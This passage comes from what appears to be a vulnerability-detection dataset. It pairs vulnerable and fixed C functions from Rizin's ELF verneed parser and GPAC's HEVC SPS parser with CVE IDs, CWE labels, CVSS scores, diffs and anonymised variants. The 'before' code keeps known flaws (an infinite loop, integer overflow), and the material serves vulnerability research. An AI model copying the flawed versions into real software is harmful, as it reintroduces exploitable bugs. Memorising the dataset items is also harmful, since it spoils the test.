for (size_t VAR_9 = 0; VAR_9 < VAR_2; VAR_9++) {
VAR_10(Verneed) VAR_11;
if (!get_verneed_entry(VAR_0, VAR_6, &VAR_11)) {
sdb_free(VAR_8);
return NULL;
}
Sdb *VAR_12 = get_verneed_entry_sdb(VAR_0, VAR_11, VAR_6);
if (!VAR_12) {
sdb_free(VAR_8);
return NULL;
}
char VAR_13[32];
if (!sdb_ns_set(VAR_8, rz_strf(VAR_13, ""version%zu"", VAR_9), VAR_12)) {
sdb_free(VAR_12);
sdb_free(VAR_8);
return NULL;
}
sdb_free(VAR_12);
VAR_6 += VAR_11.vn_next;
}
return VAR_8;
}",rizinorg/rizin/a6d89de0d44e776f9bccc3a168fdc79f604e14ed/elf_info.c/vul/before/0.json,"static Sdb *get_gnu_verneed(ELFOBJ *bin) {
	ut64 verneed_addr;
	ut64 verneed_num;

	if (!Elf_(rz_bin_elf_get_dt_info)(bin, DT_VERNEED, &verneed_addr) || !Elf_(rz_bin_elf_get_dt_info)(bin, DT_VERNEEDNUM, &verneed_num)) {
		return NULL;
	}

	ut64 verneed_offset = Elf_(rz_bin_elf_v2p(bin, verneed_addr));
	if (verneed_offset == UT64_MAX) {
		RZ_LOG_WARN(""Failed to convert verneed virtual address to physical address.\n"");
		return NULL;
	}

	Sdb *sdb = sdb_new0();
	if (!sdb) {
		return NULL;
	}

	if (!sdb_num_set(sdb, ""num_entries"", verneed_num, 0) ||
		!sdb_num_set(sdb, ""addr"", verneed_addr, 0) ||
		!sdb_num_set(sdb, ""offset"", verneed_offset, 0)) {
		sdb_free(sdb);
		return NULL;
	}

	for (size_t i = 0; i < verneed_num; i++) {
		Elf_(Verneed) verneed_entry;
		if (!get_verneed_entry(bin, verneed_offset, &verneed_entry)) {
			sdb_free(sdb);
			return NULL;
		}

		Sdb *sdb_version = get_verneed_entry_sdb(bin, verneed_entry, verneed_offset);
		if (!sdb_version) {
			sdb_free(sdb);
			return NULL;
		}

		char key[32];
		if (!sdb_ns_set(sdb, rz_strf(key, ""version%zu"", i), sdb_version)) {
			sdb_free(sdb_version);
			sdb_free(sdb);
			return NULL;
		}

		sdb_free(sdb_version);

		if (!verneed_entry.vn_next) {
			break;
		}

		verneed_offset += verneed_entry.vn_next;
	}

	return sdb;
}","static Sdb *get_gnu_verneed(ELFOBJ *VAR_0) {
	ut64 VAR_1;
	ut64 VAR_2;

	if (!Elf_(VAR_3)(VAR_0, VAR_4, &VAR_1) || !Elf_(VAR_3)(VAR_0, VAR_5, &VAR_2)) {
		return NULL;
	}

	ut64 VAR_6 = Elf_(rz_bin_elf_v2p(VAR_0, VAR_1));
	if (VAR_6 == VAR_7) {
		RZ_LOG_WARN(""Failed to convert verneed virtual address to physical address.\n"");
		return NULL;
	}

	Sdb *VAR_8 = sdb_new0();
	if (!VAR_8) {
		return NULL;
	}

	if (!sdb_num_set(VAR_8, ""num_entries"", VAR_2, 0) ||
		!sdb_num_set(VAR_8, ""addr"", VAR_1, 0) ||
		!sdb_num_set(VAR_8, ""offset"", VAR_6, 0)) {
		sdb_free(VAR_8);
		return NULL;
	}

	for (size_t VAR_9 = 0; VAR_9 < VAR_2; VAR_9++) {
		VAR_10(Verneed) VAR_11;
		if (!get_verneed_entry(VAR_0, VAR_6, &VAR_11)) {
			sdb_free(VAR_8);
			return NULL;
		}

		Sdb *VAR_12 = get_verneed_entry_sdb(VAR_0, VAR_11, VAR_6);
		if (!VAR_12) {
			sdb_free(VAR_8);
			return NULL;
		}

		char VAR_13[32];
		if (!sdb_ns_set(VAR_8, rz_strf(VAR_13, ""version%zu"", VAR_9), VAR_12)) {
			sdb_free(VAR_12);
			sdb_free(VAR_8);
			return NULL;
		}

		sdb_free(VAR_12);

		if (!VAR_11.vn_next) {
			break;
		}

		VAR_6 += VAR_11.vn_next;
	}

	return VAR_8;
}",rizinorg/rizin/a6d89de0d44e776f9bccc3a168fdc79f604e14ed/elf_info.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -46,6 +46,10 @@
 
 		sdb_free(sdb_version);
 
+		if (!verneed_entry.vn_next) {
+			break;
+		}
+
 		verneed_offset += verneed_entry.vn_next;
 	}
 ","{'deleted_lines': [], 'added_lines': ['\t\tif (!verneed_entry.vn_next) {', '\t\t\tbreak;', '\t\t}', '']}",True,An issue was discovered in function get_gnu_verneed in rizinorg Rizin prior to 0.5.0 verneed_entry allows attackers to cause a denial of service via crafted elf file.,5.5,MEDIUM,1,valid,2022-11-30T09:34:45Z,4
CVE-2022-47092,['CWE-190'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H,1,gpac,fixed #2347,6bb3e4e288f02c9c595e63230979cd5443a1cb7a,https://github.com/gpac/gpac/commit/6bb3e4e288f02c9c595e63230979cd5443a1cb7a,src/media_tools/av_parsers.c,gf_hevc_read_sps_bs_internal,"static s32 gf_hevc_read_sps_bs_internal(GF_BitStream *bs, HEVCState *hevc, u8 layer_id, u32 *vui_flag_pos)
{
s32 vps_id, sps_id = -1;
u32 i, nb_CTUs, depth;
HEVC_SPS *sps;
HEVC_VPS *vps;
HEVC_ProfileTierLevel ptl;
Bool multiLayerExtSpsFlag;
u8 sps_ext_or_max_sub_layers_minus1, max_sub_layers_minus1;
if (vui_flag_pos) *vui_flag_pos = 0;
vps_id = gf_bs_read_int_log(bs, 4, ""vps_id"");
if ((vps_id<0) || (vps_id >= 16)) {
return -1;
}
memset(&ptl, 0, sizeof(ptl));
max_sub_layers_minus1 = 0;
sps_ext_or_max_sub_layers_minus1 = 0;
if (layer_id == 0)
max_sub_layers_minus1 = gf_bs_read_int_log(bs, 3, ""max_sub_layers_minus1"");
else
sps_ext_or_max_sub_layers_minus1 = gf_bs_read_int_log(bs, 3, ""sps_ext_or_max_sub_layers_minus1"");
multiLayerExtSpsFlag = (layer_id != 0) && (sps_ext_or_max_sub_layers_minus1 == 7);
if (!multiLayerExtSpsFlag) {
gf_bs_read_int_log(bs, 1, ""temporal_id_nesting_flag"");
hevc_profile_tier_level(bs, 1, max_sub_layers_minus1, &ptl, 0);
}
sps_id = gf_bs_read_ue_log(bs, ""sps_id"");
if ((sps_id < 0) || (sps_id >= 16)) {
return -1;
}
sps = &hevc->sps[sps_id];
if (!sps->state) {
sps->state = 1;
sps->id = sps_id;
sps->vps_id = vps_id;
}
sps->ptl = ptl;
vps = &hevc->vps[vps_id];
sps->max_sub_layers_minus1 = 0;
sps->sps_ext_or_max_sub_layers_minus1 = 0;
sps->colour_primaries = 2;
sps->transfer_characteristic = 2;
sps->matrix_coeffs = 2;
if (multiLayerExtSpsFlag) {
sps->update_rep_format_flag = gf_bs_read_int_log(bs, 1, ""update_rep_format_flag"");
if (sps->update_rep_format_flag) {
sps->rep_format_idx = gf_bs_read_int_log(bs, 8, ""rep_format_idx"");
if (sps->rep_format_idx>15) {
return -1;
}
} else {
sps->rep_format_idx = vps->rep_format_idx[layer_id];
}
sps->width = vps->rep_formats[sps->rep_format_idx].pic_width_luma_samples;
sps->height = vps->rep_formats[sps->rep_format_idx].pic_height_luma_samples;
sps->chroma_format_idc = vps->rep_formats[sps->rep_format_idx].chroma_format_idc;
sps->bit_depth_luma = vps->rep_formats[sps->rep_format_idx].bit_depth_luma;
sps->bit_depth_chroma = vps->rep_formats[sps->rep_format_idx].bit_depth_chroma;
sps->separate_colour_plane_flag = vps->rep_formats[sps->rep_format_idx].separate_colour_plane_flag;
sps->ptl = vps->ext_ptl[0];
}
else {
sps->chroma_format_idc = gf_bs_read_ue_log(bs, ""chroma_format_idc"");
if (sps->chroma_format_idc == 3)
sps->separate_colour_plane_flag = gf_bs_read_int_log(bs, 1, ""separate_colour_plane_flag"");
sps->width = gf_bs_read_ue_log(bs, ""width"");
sps->height = gf_bs_read_ue_log(bs, ""height"");
if ((sps->cw_flag = gf_bs_read_int_log(bs, 1, ""conformance_window_flag""))) {
u32 SubWidthC, SubHeightC;
if (sps->chroma_format_idc == 1) {
SubWidthC = SubHeightC = 2;
}
else if (sps->chroma_format_idc == 2) {
SubWidthC = 2;
SubHeightC = 1;
}
else {
SubWidthC = SubHeightC = 1;
}
sps->cw_left = gf_bs_read_ue_log(bs, ""conformance_window_left"");
sps->cw_right = gf_bs_read_ue_log(bs, ""conformance_window_right"");
sps->cw_top = gf_bs_read_ue_log(bs, ""conformance_window_top"");
sps->cw_bottom = gf_bs_read_ue_log(bs, ""conformance_window_bottom"");
sps->width -= SubWidthC * (sps->cw_left + sps->cw_right);
sps->height -= SubHeightC * (sps->cw_top + sps->cw_bottom);
}
sps->bit_depth_luma = 8 + gf_bs_read_ue_log(bs, ""bit_depth_luma_minus8"");
sps->bit_depth_chroma = 8 + gf_bs_read_ue_log(bs, ""bit_depth_chroma_minus8"");
}
sps->log2_max_pic_order_cnt_lsb = 4 + gf_bs_read_ue_log(bs, ""log2_max_pic_order_cnt_lsb_minus4"");
if (!multiLayerExtSpsFlag) {
sps->sub_layer_ordering_info_present_flag = gf_bs_read_int_log(bs, 1, ""sub_layer_ordering_info_present_flag"");
for (i = sps->sub_layer_ordering_info_present_flag ? 0 : sps->max_sub_layers_minus1; i <= sps->max_sub_layers_minus1; i++) {
gf_bs_read_ue_log_idx(bs, ""max_dec_pic_buffering"", i);
gf_bs_read_ue_log_idx(bs, ""num_reorder_pics"", i);
gf_bs_read_ue_log_idx(bs, ""max_latency_increase"", i);
}
}
sps->log2_min_luma_coding_block_size = 3 + gf_bs_read_ue_log(bs, ""log2_min_luma_coding_block_size_minus3"");
sps->log2_diff_max_min_luma_coding_block_size = gf_bs_read_ue_log(bs, ""log2_diff_max_min_luma_coding_block_size"");
sps->max_CU_width = (1 << (sps->log2_min_luma_coding_block_size + sps->log2_diff_max_min_luma_coding_block_size));
sps->max_CU_height = (1 << (sps->log2_min_luma_coding_block_size + sps->log2_diff_max_min_luma_coding_block_size));
sps->log2_min_transform_block_size = 2 + gf_bs_read_ue_log(bs, ""log2_min_transform_block_size_minus2"");
sps->log2_max_transform_block_size = sps->log2_min_transform_block_size  + gf_bs_read_ue_log(bs, ""log2_max_transform_block_size"");
depth = 0;
sps->max_transform_hierarchy_depth_inter = gf_bs_read_ue_log(bs, ""max_transform_hierarchy_depth_inter"");
sps->max_transform_hierarchy_depth_intra = gf_bs_read_ue_log(bs, ""max_transform_hierarchy_depth_intra"");
while ((u32)(sps->max_CU_width >> sps->log2_diff_max_min_luma_coding_block_size) > (u32)(1 << (sps->log2_min_transform_block_size + depth)))
{
depth++;
}
sps->max_CU_depth = sps->log2_diff_max_min_luma_coding_block_size + depth;
nb_CTUs = ((sps->width + sps->max_CU_width - 1) / sps->max_CU_width) * ((sps->height + sps->max_CU_height - 1) / sps->max_CU_height);
sps->bitsSliceSegmentAddress = 0;
while (nb_CTUs > (u32)(1 << sps->bitsSliceSegmentAddress)) {
sps->bitsSliceSegmentAddress++;
}
sps->scaling_list_enable_flag = gf_bs_read_int_log(bs, 1, ""scaling_list_enable_flag"");
if (sps->scaling_list_enable_flag) {
sps->infer_scaling_list_flag = 0;
sps->scaling_list_ref_layer_id = 0;
if (multiLayerExtSpsFlag) {
sps->infer_scaling_list_flag = gf_bs_read_int_log(bs, 1, ""infer_scaling_list_flag"");
}
if (sps->infer_scaling_list_flag) {
sps->scaling_list_ref_layer_id = gf_bs_read_int_log(bs, 6, ""scaling_list_ref_layer_id"");
}
else {
sps->scaling_list_data_present_flag = gf_bs_read_int_log(bs, 1, ""scaling_list_data_present_flag"");
if (sps->scaling_list_data_present_flag) {
hevc_scaling_list_data(bs);
}
}
}
sps->asymmetric_motion_partitions_enabled_flag = gf_bs_read_int_log(bs, 1, ""asymmetric_motion_partitions_enabled_flag"");
sps->sample_adaptive_offset_enabled_flag = gf_bs_read_int_log(bs, 1, ""sample_adaptive_offset_enabled_flag"");
if ( (sps->pcm_enabled_flag = gf_bs_read_int_log(bs, 1, ""pcm_enabled_flag"")) ) {
sps->pcm_sample_bit_depth_luma_minus1 = gf_bs_read_int_log(bs, 4, ""pcm_sample_bit_depth_luma_minus1"");
sps->pcm_sample_bit_depth_chroma_minus1 = gf_bs_read_int_log(bs, 4, ""pcm_sample_bit_depth_chroma_minus1"");
sps->log2_min_pcm_luma_coding_block_size_minus3 = gf_bs_read_ue_log(bs, ""log2_min_pcm_luma_coding_block_size_minus3"");
sps->log2_diff_max_min_pcm_luma_coding_block_size = gf_bs_read_ue_log(bs, ""log2_diff_max_min_pcm_luma_coding_block_size"");
sps->pcm_loop_filter_disable_flag = gf_bs_read_int_log(bs, 1, ""pcm_loop_filter_disable_flag"");
}
sps->num_short_term_ref_pic_sets = gf_bs_read_ue_log(bs, ""num_short_term_ref_pic_sets"");
if (sps->num_short_term_ref_pic_sets > 64) {
GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, (""[HEVC] Invalid number of short term reference picture sets %d\n"", sps->num_short_term_ref_pic_sets));
return -1;
}
for (i = 0; i < sps->num_short_term_ref_pic_sets; i++) {
Bool ret = hevc_parse_short_term_ref_pic_set(bs, sps, i);
if (!ret) {
GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, (""[HEVC] Invalid short_term_ref_pic_set\n""));
return -1;
}
}
sps->long_term_ref_pics_present_flag = gf_bs_read_int_log(bs, 1, ""long_term_ref_pics_present_flag"");
if (sps->long_term_ref_pics_present_flag) {
sps->num_long_term_ref_pic_sps = gf_bs_read_ue_log(bs, ""num_long_term_ref_pic_sps"");
for (i = 0; i < sps->num_long_term_ref_pic_sps; i++) {
gf_bs_read_int_log_idx(bs, sps->log2_max_pic_order_cnt_lsb, ""lt_ref_pic_poc_lsb_sps"", i);
gf_bs_read_int_log_idx(bs, 1, ""used_by_curr_pic_lt_sps_flag"", i);
}
}
sps->temporal_mvp_enable_flag = gf_bs_read_int_log(bs, 1, ""temporal_mvp_enable_flag"");
sps->strong_intra_smoothing_enable_flag = gf_bs_read_int_log(bs, 1, ""strong_intra_smoothing_enable_flag"");
if (vui_flag_pos)
*vui_flag_pos = (u32)gf_bs_get_bit_offset(bs);
if ((sps->vui_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""vui_parameters_present_flag"")) ) {
sps->aspect_ratio_info_present_flag = gf_bs_read_int_log(bs, 1, ""aspect_ratio_info_present_flag"");
if (sps->aspect_ratio_info_present_flag) {
sps->sar_idc = gf_bs_read_int_log(bs, 8, ""aspect_ratio_idc"");
if (sps->sar_idc == 255) {
sps->sar_width = gf_bs_read_int_log(bs, 16, ""aspect_ratio_width"");
sps->sar_height = gf_bs_read_int_log(bs, 16, ""aspect_ratio_height"");
}
else if (sps->sar_idc < 17) {
sps->sar_width = hevc_sar[sps->sar_idc].w;
sps->sar_height = hevc_sar[sps->sar_idc].h;
}
}
if ((sps->overscan_info_present = gf_bs_read_int_log(bs, 1, ""overscan_info_present"")))
sps->overscan_appropriate = gf_bs_read_int_log(bs, 1, ""overscan_appropriate"");
sps->video_signal_type_present_flag = gf_bs_read_int_log(bs, 1, ""video_signal_type_present_flag"");
if (sps->video_signal_type_present_flag) {
sps->video_format = gf_bs_read_int_log(bs, 3, ""video_format"");
sps->video_full_range_flag = gf_bs_read_int_log(bs, 1, ""video_full_range_flag"");
if ((sps->colour_description_present_flag = gf_bs_read_int_log(bs, 1, ""colour_description_present_flag""))) {
sps->colour_primaries = gf_bs_read_int_log(bs, 8, ""colour_primaries"");
sps->transfer_characteristic = gf_bs_read_int_log(bs, 8, ""transfer_characteristic"");
sps->matrix_coeffs = gf_bs_read_int_log(bs, 8, ""matrix_coefficients"");
}
}
if ((sps->chroma_loc_info_present_flag = gf_bs_read_int_log(bs, 1, ""chroma_loc_info_present_flag""))) {
sps->chroma_sample_loc_type_top_field = gf_bs_read_ue_log(bs, ""chroma_sample_loc_type_top_field"");
sps->chroma_sample_loc_type_bottom_field = gf_bs_read_ue_log(bs, ""chroma_sample_loc_type_bottom_field"");
}
sps->neutral_chroma_indication_flag = gf_bs_read_int_log(bs, 1, ""neutral_chroma_indication_flag"");
sps->field_seq_flag = gf_bs_read_int_log(bs, 1, ""field_seq_flag"");
sps->frame_field_info_present_flag = gf_bs_read_int_log(bs, 1, ""frame_field_info_present_flag"");
if ((sps->default_display_window_flag = gf_bs_read_int_log(bs, 1, ""default_display_window_flag""))) {
sps->left_offset = gf_bs_read_ue_log(bs, ""display_window_left_offset"");
sps->right_offset = gf_bs_read_ue_log(bs, ""display_window_right_offset"");
sps->top_offset = gf_bs_read_ue_log(bs, ""display_window_top_offset"");
sps->bottom_offset = gf_bs_read_ue_log(bs, ""display_window_bottom_offset"");
}
sps->has_timing_info = gf_bs_read_int_log(bs, 1, ""has_timing_info"");
if (sps->has_timing_info) {
sps->num_units_in_tick = gf_bs_read_int_log(bs, 32, ""num_units_in_tick"");
sps->time_scale = gf_bs_read_int_log(bs, 32, ""time_scale"");
sps->poc_proportional_to_timing_flag = gf_bs_read_int_log(bs, 1, ""poc_proportional_to_timing_flag"");
if (sps->poc_proportional_to_timing_flag)
sps->num_ticks_poc_diff_one_minus1 = gf_bs_read_ue_log(bs, ""num_ticks_poc_diff_one_minus1"");
if ((sps->hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""hrd_parameters_present_flag""))) {
return sps_id;
}
}
if (gf_bs_read_int_log(bs, 1, ""bitstream_restriction_flag"")) {
gf_bs_read_int_log(bs, 1, ""tiles_fixed_structure_flag"");
gf_bs_read_int_log(bs, 1, ""motion_vectors_over_pic_boundaries_flag"");
gf_bs_read_int_log(bs, 1, ""restricted_ref_pic_lists_flag"");
gf_bs_read_ue_log(bs, ""min_spatial_segmentation_idc"");
gf_bs_read_ue_log(bs, ""max_bytes_per_pic_denom"");
gf_bs_read_ue_log(bs, ""max_bits_per_min_cu_denom"");
gf_bs_read_ue_log(bs, ""log2_max_mv_length_horizontal"");
gf_bs_read_ue_log(bs, ""log2_max_mv_length_vertical"");
}
}
if (gf_bs_read_int_log(bs, 1, ""sps_extension_flag"")) {
#if 0
while (gf_bs_available(bs)) {
gf_bs_read_int(bs, 1);
}
#endif
}
return sps_id;
}","static s32 gf_hevc_read_sps_bs_internal(GF_BitStream *VAR_0, HEVCState *VAR_1, u8 VAR_2, u32 *VAR_3)
{
s32 VAR_4, VAR_5 = -1;
u32 VAR_6, VAR_7, VAR_8;
HEVC_SPS *VAR_9;
HEVC_VPS *VAR_10;
HEVC_ProfileTierLevel VAR_11;
Bool VAR_12;
u8 VAR_13, VAR_14;
if (VAR_3) *VAR_3 = 0;
VAR_4 = gf_bs_read_int_log(VAR_0, 4, ""vps_id"");
if ((VAR_4<0) || (VAR_4 >= 16)) {
return -1;
}
memset(&VAR_11, 0, sizeof(VAR_11));
VAR_14 = 0;
VAR_13 = 0;
if (VAR_2 == 0)
VAR_14 = gf_bs_read_int_log(VAR_0, 3, ""max_sub_layers_minus1"");
else
VAR_13 = gf_bs_read_int_log(VAR_0, 3, ""sps_ext_or_max_sub_layers_minus1"");
VAR_12 = (VAR_2 != 0) && (VAR_13 == 7);
if (!VAR_12) {
gf_bs_read_int_log(VAR_0, 1, ""temporal_id_nesting_flag"");
hevc_profile_tier_level(VAR_0, 1, VAR_14, &VAR_11, 0);
}
VAR_5 = gf_bs_read_ue_log(VAR_0, ""sps_id"");
if ((VAR_5 < 0) || (VAR_5 >= 16)) {
return -1;
}
VAR_9 = &VAR_1->sps[VAR_5];
if (!VAR_9->state) {
VAR_9->state = 1;
VAR_9->id = VAR_5;
VAR_9->vps_id = VAR_4;
}
VAR_9->ptl = VAR_11;
VAR_10 = &VAR_1->vps[VAR_4];
VAR_9->max_sub_layers_minus1 = 0;
VAR_9->sps_ext_or_max_sub_layers_minus1 = 0;
VAR_9->colour_primaries = 2;
VAR_9->transfer_characteristic = 2;
VAR_9->matrix_coeffs = 2;
if (VAR_12) {
VAR_9->update_rep_format_flag = gf_bs_read_int_log(VAR_0, 1, ""update_rep_format_flag"");
if (VAR_9->update_rep_format_flag) {
VAR_9->rep_format_idx = gf_bs_read_int_log(VAR_0, 8, ""rep_format_idx"");
if (VAR_9->rep_format_idx>15) {
return -1;
}
} else {
VAR_9->rep_format_idx = VAR_10->rep_format_idx[VAR_2];
}
VAR_9->width = VAR_10->rep_formats[VAR_9->rep_format_idx].pic_width_luma_samples;
VAR_9->height = VAR_10->rep_formats[VAR_9->rep_format_idx].pic_height_luma_samples;
VAR_9->chroma_format_idc = VAR_10->rep_formats[VAR_9->rep_format_idx].chroma_format_idc;
VAR_9->bit_depth_luma = VAR_10->rep_formats[VAR_9->rep_format_idx].bit_depth_luma;
VAR_9->bit_depth_chroma = VAR_10->rep_formats[VAR_9->rep_format_idx].bit_depth_chroma;
VAR_9->separate_colour_plane_flag = VAR_10->rep_formats[VAR_9->rep_format_idx].separate_colour_plane_flag;
VAR_9->ptl = VAR_10->ext_ptl[0];
}
else {
VAR_9->chroma_format_idc = gf_bs_read_ue_log(VAR_0, ""chroma_format_idc"");
if (VAR_9->chroma_format_idc == 3)
VAR_9->separate_colour_plane_flag = gf_bs_read_int_log(VAR_0, 1, ""separate_colour_plane_flag"");
VAR_9->width = gf_bs_read_ue_log(VAR_0, ""width"");
VAR_9->height = gf_bs_read_ue_log(VAR_0, ""height"");
if ((VAR_9->cw_flag = gf_bs_read_int_log(VAR_0, 1, ""conformance_window_flag""))) {
u32 VAR_15, VAR_16;
if (VAR_9->chroma_format_idc == 1) {
VAR_15 = VAR_16 = 2;
}
else if (VAR_9->chroma_format_idc == 2) {
VAR_15 = 2;
VAR_16 = 1;
}
else {
VAR_15 = VAR_16 = 1;
}
VAR_9->cw_left = gf_bs_read_ue_log(VAR_0, ""conformance_window_left"");
VAR_9->cw_right = gf_bs_read_ue_log(VAR_0, ""conformance_window_right"");
VAR_9->cw_top = gf_bs_read_ue_log(VAR_0, ""conformance_window_top"");
VAR_9->cw_bottom = gf_bs_read_ue_log(VAR_0, ""conformance_window_bottom"");
VAR_9->width -= VAR_15 * (VAR_9->cw_left + VAR_9->cw_right);
VAR_9->height -= VAR_16 * (VAR_9->cw_top + VAR_9->cw_bottom);
}
VAR_9->bit_depth_luma = 8 + gf_bs_read_ue_log(VAR_0, ""bit_depth_luma_minus8"");
VAR_9->bit_depth_chroma = 8 + gf_bs_read_ue_log(VAR_0, ""bit_depth_chroma_minus8"");
}
VAR_9->log2_max_pic_order_cnt_lsb = 4 + gf_bs_read_ue_log(VAR_0, ""log2_max_pic_order_cnt_lsb_minus4"");
if (!VAR_12) {
VAR_9->sub_layer_ordering_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""sub_layer_ordering_info_present_flag"");
for (VAR_6 = VAR_9->sub_layer_ordering_info_present_flag ? 0 : VAR_9->max_sub_layers_minus1; VAR_6 <= VAR_9->max_sub_layers_minus1; VAR_6++) {
gf_bs_read_ue_log_idx(VAR_0, ""max_dec_pic_buffering"", VAR_6);
gf_bs_read_ue_log_idx(VAR_0, ""num_reorder_pics"", VAR_6);
gf_bs_read_ue_log_idx(VAR_0, ""max_latency_increase"", VAR_6);
}
}
VAR_9->log2_min_luma_coding_block_size = 3 + gf_bs_read_ue_log(VAR_0, ""log2_min_luma_coding_block_size_minus3"");
VAR_9->log2_diff_max_min_luma_coding_block_size = gf_bs_read_ue_log(VAR_0, ""log2_diff_max_min_luma_coding_block_size"");
VAR_9->max_CU_width = (1 << (VAR_9->log2_min_luma_coding_block_size + VAR_9->log2_diff_max_min_luma_coding_block_size));
VAR_9->max_CU_height = (1 << (VAR_9->log2_min_luma_coding_block_size + VAR_9->log2_diff_max_min_luma_coding_block_size));
VAR_9->log2_min_transform_block_size = 2 + gf_bs_read_ue_log(VAR_0, ""log2_min_transform_block_size_minus2"");
VAR_9->log2_max_transform_block_size = VAR_9->log2_min_transform_block_size  + gf_bs_read_ue_log(VAR_0, ""log2_max_transform_block_size"");
VAR_8 = 0;
VAR_9->max_transform_hierarchy_depth_inter = gf_bs_read_ue_log(VAR_0, ""max_transform_hierarchy_depth_inter"");
VAR_9->max_transform_hierarchy_depth_intra = gf_bs_read_ue_log(VAR_0, ""max_transform_hierarchy_depth_intra"");
while ((u32)(VAR_9->max_CU_width >> VAR_9->log2_diff_max_min_luma_coding_block_size) > (u32)(1 << (VAR_9->log2_min_transform_block_size + VAR_8)))
{
VAR_8++;
}
VAR_9->max_CU_depth = VAR_9->log2_diff_max_min_luma_coding_block_size + VAR_8;
VAR_7 = ((VAR_9->width + VAR_9->max_CU_width - 1) / VAR_9->max_CU_width) * ((VAR_9->height + VAR_9->max_CU_height - 1) / VAR_9->max_CU_height);
VAR_9->bitsSliceSegmentAddress = 0;
while (VAR_7 > (u32)(1 << VAR_9->bitsSliceSegmentAddress)) {
VAR_9->bitsSliceSegmentAddress++;
}
VAR_9->scaling_list_enable_flag = gf_bs_read_int_log(VAR_0, 1, ""scaling_list_enable_flag"");
if (VAR_9->scaling_list_enable_flag) {
VAR_9->infer_scaling_list_flag = 0;
VAR_9->scaling_list_ref_layer_id = 0;
if (VAR_12) {
VAR_9->infer_scaling_list_flag = gf_bs_read_int_log(VAR_0, 1, ""infer_scaling_list_flag"");
}
if (VAR_9->infer_scaling_list_flag) {
VAR_9->scaling_list_ref_layer_id = gf_bs_read_int_log(VAR_0, 6, ""scaling_list_ref_layer_id"");
}
else {
VAR_9->scaling_list_data_present_flag = gf_bs_read_int_log(VAR_0, 1, ""scaling_list_data_present_flag"");
if (VAR_9->scaling_list_data_present_flag) {
hevc_scaling_list_data(VAR_0);
}
}
}
VAR_9->asymmetric_motion_partitions_enabled_flag = gf_bs_read_int_log(VAR_0, 1, ""asymmetric_motion_partitions_enabled_flag"");
VAR_9->sample_adaptive_offset_enabled_flag = gf_bs_read_int_log(VAR_0, 1, ""sample_adaptive_offset_enabled_flag"");
if ( (VAR_9->pcm_enabled_flag = gf_bs_read_int_log(VAR_0, 1, ""pcm_enabled_flag"")) ) {
VAR_9->pcm_sample_bit_depth_luma_minus1 = gf_bs_read_int_log(VAR_0, 4, ""pcm_sample_bit_depth_luma_minus1"");
VAR_9->pcm_sample_bit_depth_chroma_minus1 = gf_bs_read_int_log(VAR_0, 4, ""pcm_sample_bit_depth_chroma_minus1"");
VAR_9->log2_min_pcm_luma_coding_block_size_minus3 = gf_bs_read_ue_log(VAR_0, ""log2_min_pcm_luma_coding_block_size_minus3"");
VAR_9->log2_diff_max_min_pcm_luma_coding_block_size = gf_bs_read_ue_log(VAR_0, ""log2_diff_max_min_pcm_luma_coding_block_size"");
VAR_9->pcm_loop_filter_disable_flag = gf_bs_read_int_log(VAR_0, 1, ""pcm_loop_filter_disable_flag"");
}
VAR_9->num_short_term_ref_pic_sets = gf_bs_read_ue_log(VAR_0, ""num_short_term_ref_pic_sets"");
if (VAR_9->num_short_term_ref_pic_sets > 64) {
GF_LOG(VAR_17, VAR_18, (""[HEVC] Invalid number of short term reference picture sets %d\n"", VAR_9->num_short_term_ref_pic_sets));
return -1;
}
for (VAR_6 = 0; VAR_6 < VAR_9->num_short_term_ref_pic_sets; VAR_6++) {
Bool VAR_19 = hevc_parse_short_term_ref_pic_set(VAR_0, VAR_9, VAR_6);
if (!VAR_19) {
GF_LOG(VAR_17, VAR_18, (""[HEVC] Invalid short_term_ref_pic_set\n""));
return -1;
}
}
VAR_9->long_term_ref_pics_present_flag = gf_bs_read_int_log(VAR_0, 1, ""long_term_ref_pics_present_flag"");
if (VAR_9->long_term_ref_pics_present_flag) {
VAR_9->num_long_term_ref_pic_sps = gf_bs_read_ue_log(VAR_0, ""num_long_term_ref_pic_sps"");
for (VAR_6 = 0; VAR_6 < VAR_9->num_long_term_ref_pic_sps; VAR_6++) {
gf_bs_read_int_log_idx(VAR_0, VAR_9->log2_max_pic_order_cnt_lsb, ""lt_ref_pic_poc_lsb_sps"", VAR_6);
gf_bs_read_int_log_idx(VAR_0, 1, ""used_by_curr_pic_lt_sps_flag"", VAR_6);
}
}
VAR_9->temporal_mvp_enable_flag = gf_bs_read_int_log(VAR_0, 1, ""temporal_mvp_enable_flag"");
VAR_9->strong_intra_smoothing_enable_flag = gf_bs_read_int_log(VAR_0, 1, ""strong_intra_smoothing_enable_flag"");
if (VAR_3)
*VAR_3 = (u32)gf_bs_get_bit_offset(VAR_0);
if ((VAR_9->vui_parameters_present_flag = gf_bs_read_int_log(VAR_0, 1, ""vui_parameters_present_flag"")) ) {
VAR_9->aspect_ratio_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""aspect_ratio_info_present_flag"");
if (VAR_9->aspect_ratio_info_present_flag) {
VAR_9->sar_idc = gf_bs_read_int_log(VAR_0, 8, ""aspect_ratio_idc"");
if (VAR_9->sar_idc == 255) {
VAR_9->sar_width = gf_bs_read_int_log(VAR_0, 16, ""aspect_ratio_width"");
VAR_9->sar_height = gf_bs_read_int_log(VAR_0, 16, ""aspect_ratio_height"");
}
else if (VAR_9->sar_idc < 17) {
VAR_9->sar_width = VAR_20[VAR_9->sar_idc].w;
VAR_9->sar_height = VAR_20[VAR_9->sar_idc].h;
}
}
if ((VAR_9->overscan_info_present = gf_bs_read_int_log(VAR_0, 1, ""overscan_info_present"")))
VAR_9->overscan_appropriate = gf_bs_read_int_log(VAR_0, 1, ""overscan_appropriate"");
VAR_9->video_signal_type_present_flag = gf_bs_read_int_log(VAR_0, 1, ""video_signal_type_present_flag"");
if (VAR_9->video_signal_type_present_flag) {
VAR_9->video_format = gf_bs_read_int_log(VAR_0, 3, ""video_format"");
VAR_9->video_full_range_flag = gf_bs_read_int_log(VAR_0, 1, ""video_full_range_flag"");
if ((VAR_9->colour_description_present_flag = gf_bs_read_int_log(VAR_0, 1, ""colour_description_present_flag""))) {
VAR_9->colour_primaries = gf_bs_read_int_log(VAR_0, 8, ""colour_primaries"");
